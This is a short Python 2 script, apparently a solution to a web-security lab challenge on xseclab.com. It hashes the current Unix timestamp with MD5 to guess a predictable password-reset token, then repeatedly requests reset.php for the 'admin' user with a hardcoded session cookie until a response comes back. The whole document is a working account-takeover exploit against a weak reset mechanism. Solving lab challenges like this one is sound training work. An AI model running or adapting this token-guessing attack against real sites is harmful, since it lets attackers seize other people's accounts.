import requests
import hashlib
import time

se = requests.session()
headers = {'Cookie': 'PHPSESSID=782bd0266453697a5955cace9337882b'}

while  1:
    sukey = hashlib.new('md5', str(int(time.time()))).hexdigest()
    url = 'http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + sukey + '&username=admin'
    r = se.get(url, headers=headers)
    time.sleep(0.5)
    if r.content:
        print r.content
        break
    else:
        print 'Cracking:  ' + sukey
